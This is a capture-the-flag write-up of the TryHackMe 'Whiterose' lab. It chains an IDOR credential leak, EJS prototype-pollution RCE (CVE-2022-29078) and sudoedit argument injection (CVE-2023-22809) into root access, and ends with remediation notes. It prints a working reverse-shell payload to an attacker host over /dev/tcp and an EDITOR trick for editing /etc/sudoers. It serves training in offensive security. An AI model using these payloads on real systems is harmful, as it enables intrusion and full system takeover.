# Write-Up: Whiterose — TryHackMe

**Difficulty:** Easy
**Category:** Web Exploitation (IDOR, EJS Prototype Pollution / RCE), Linux Privilege Escalation (sudoedit)
**Target:** Cyprus Bank web application — gain access to the admin panel, achieve RCE, escalate to root

## Tasks

1. Find Tyrell Wellick's phone number
2. Read `user.txt`
3. Escalate privileges and read `root.txt`

---

## Recon

### Port Scan / Initial Info

- Target IP: `10.113.181.216`
- Domain: `cyprusbank.thm`

### Port Scan

```bash
nmap -sC -sV -p- -oN scan.txt 10.113.181.216
```

Results:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 |
| 80/tcp | HTTP | nginx 1.14.0 (Ubuntu) |

Only two ports open, no title on the HTTP root page → relevant content likely behind virtual hosts.

### Virtual Host Fuzzing

```bash
ffuf -u http://cyprusbank.thm -H "Host: FUZZ.cyprusbank.thm" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 57
```
note: checked response time before without -fs to get the filter right.

Results:

| Vhost | Status |
|-------|--------|
| `www.cyprusbank.thm` | 200 |
| `admin.cyprusbank.thm` | 302 (redirect) |

Added `admin.cyprusbank.thm` to `/etc/hosts`. The redirect target was checked with `curl -sI`.

`www.cyprusbank.thm` only served a generic maintenance page — no further use.

---

## Exploitation

### Step 1 — Login as Olivia Cortez

Logged in to `admin.cyprusbank.thm/login` with credentials from the assessment (`Olivia Cortez:olivi8`).

### Step 2 — IDOR in Chat Messages (Privilege/Credential Leak)

The endpoint `/messages/?c=N` paginates through chat messages without authorization checks (IDOR). Iterating `c=N` exposed an old developer chat (`c=10`) containing:

```
Gayle Bev password: '(REDACTED)'
```

### Step 3 — Login as Gayle Bev (Flag 1)

Logging in as Gayle Bev grants higher privileges: unmasked phone numbers and access to the `/settings` page.

**Tyrell Wellick's phone number:** `842-029-5701` (found via Gayle Bev's account).

### Step 4 — Dead Ends (documented for completeness)

- `/settings` (Customer Settings — name + password change): the response "Password updated to 'X'" appears regardless of whether the name exists or contains a quote. A `SLEEP(5)` payload via sqlmap caused no delay (~0.1s) → **no real SQL injection**, just a generic success message independent of the query result (false positive).
- `/search?name=`: case-sensitive substring match (`Terry` matches, `terry` doesn't) → likely a simple JS `includes()` filter, not SQLi.
- Gobuster against `admin.cyprusbank.thm` (authenticated as Gayle) found nothing new beyond `login`, `logout`, `messages`, `search`, `settings`.

### Step 5 — Stack Trace Reveals Backend Stack

Sending a POST through burp to `/settings` with a missing `password` parameter (only `name=a`) triggered an **EJS `ReferenceError`**. The stack trace revealed:

- `/home/web/app/views/settings.ejs`
- `/home/web/app/routes/settings.js`

This confirmed the backend uses **EJS templates**, raising suspicion of Server-Side Template Injection (SSTI).

### Step 6 — CVE-2022-29078 (EJS Prototype Pollution → RCE)

`POST /settings` is vulnerable to **CVE-2022-29078**, an EJS prototype pollution issue via `settings[view options][outputFunctionName]`, which allows arbitrary code execution when `req.body` is passed unfiltered into render options.

**Verification:** a `sleep 5` payload caused the response to take ~15s instead of ~50ms → RCE confirmed.

**Reverse shell payload** (note: `&` inside the bash command must be URL-encoded as `%26`, otherwise it breaks the `x-www-form-urlencoded` body):

```
name=test&password=test123&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<KALI_IP>/4444%200%3E%261%22');x
```

Listener on Kali:

```bash
nc -lvnp 4444
```

Result: reverse shell as `web` (`uid=1001(web) gid=1001(web)`).

PTY upgrade:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
```

---
cat user.txt
**user.txt:** `THM{REDACTED}`

## Post-Exploitation / Privilege Escalation

### Step 1 — sudo -l

```bash
sudo -l
```

`web` may run, **NOPASSWD**:

```
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

### Step 2 — CVE-2023-22809 (sudoedit Argument Injection)

```bash
sudo -V
```

Version `1.9.12p1` is vulnerable to **CVE-2023-22809** — a flaw in `sudoedit` that allows argument injection via the `EDITOR`/`VISUAL` environment variable, enabling editing of arbitrary files as root.

**Exploit:**

```bash
export EDITOR="vim -- /etc/sudoers"
sudo -e /etc/nginx/sites-available/admin.cyprusbank.thm
```

Inside vim, an additional line was added to `/etc/sudoers`:

```
web ALL=(ALL) NOPASSWD: ALL
```

Saved with `:wq`, then:

```bash
sudo bash
```

→ root shell.

**root.txt:** `THM{REDACTED}`

---

## Vulnerability Summary

### Finding 1 — IDOR in `/messages/?c=N`

**Severity:** High

The `c` parameter is a sequential ID without authorization checks, allowing any authenticated user to enumerate and read chat messages belonging to other users — including a message containing another account's plaintext password.

**Remediation:** Enforce authorization checks on message ownership/conversation membership. Use non-sequential, unguessable identifiers (UUIDs) as defense in depth.

---

### Finding 2 — EJS Prototype Pollution → RCE (CVE-2022-29078)

**Severity:** Critical

`POST /settings` passes user-controlled `req.body` fields directly into EJS render options. By setting `settings[view options][outputFunctionName]`, an attacker can pollute the EJS configuration object and inject arbitrary JavaScript that is executed via `process.mainModule.require('child_process').execSync(...)`, resulting in full remote code execution as the `web` user.

**Payload:**
```
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('<command>');x
```

**Remediation:** Upgrade EJS to a patched version (>= 3.1.7). Never pass unvalidated user input into template render options. Apply strict input validation/whitelisting on form fields.

---

### Finding 3 — sudoedit Argument Injection (CVE-2023-22809)

**Severity:** Critical

The `web` user has `NOPASSWD` sudo rights to `sudoedit` a single nginx config file. Due to CVE-2023-22809, setting `EDITOR`/`VISUAL` to include extra arguments (`vim -- /etc/sudoers`) causes `sudoedit` to open an additional, attacker-chosen file with root privileges, allowing arbitrary file edits — including `/etc/sudoers` — and full privilege escalation to root.

**Remediation:** Upgrade sudo to >= 1.9.12p2. Avoid granting `sudoedit` rights where the editor environment is attacker-controlled. Apply least-privilege sudo rules and audit `sudo -l` output regularly.

---

## Attack Chain

```
vhost fuzzing → admin.cyprusbank.thm
              ↓
      Login (Olivia Cortez)
              ↓
      IDOR /messages/?c=N → leaked Gayle Bev credentials
              ↓
      Login as Gayle Bev →  phone number lookup
              ↓
      Stack trace via missing POST param → backend stack = EJS
              ↓
      CVE-2022-29078 (EJS prototype pollution) → RCE as 'web'
              ↓
      cat Flag 1 (user.txt)
              ↓
      sudo -l → sudoedit on nginx config (NOPASSWD)
              ↓
      CVE-2023-22809 (sudoedit argument injection) → edit /etc/sudoers
              ↓
      sudo bash → root → Flag 2 (root.txt)
```

---

## Lessons Learned

- Vhost enumeration via Host-header fuzzing can reveal subdomains that aren't resolvable via DNS.
- An IDOR via a simple sequential parameter (`c=N`) can expose sensitive historical data (chat logs) including credentials.
- Stack traces (e.g. provoked by missing parameters) leak the backend stack (EJS) and internal file paths — useful for targeting specific CVEs.
- CVE-2022-29078: EJS prototype pollution via `outputFunctionName` leads to RCE when `req.body` is passed unfiltered into render options.
- `&` in reverse shell payloads must be URL-encoded as `%26` in `x-www-form-urlencoded` bodies, otherwise the body is truncated.
- CVE-2023-22809: a `sudoedit` permission scoped to a single file can be abused via `EDITOR="vim -- <target>"` to edit arbitrary files (e.g. `/etc/sudoers`) as root.
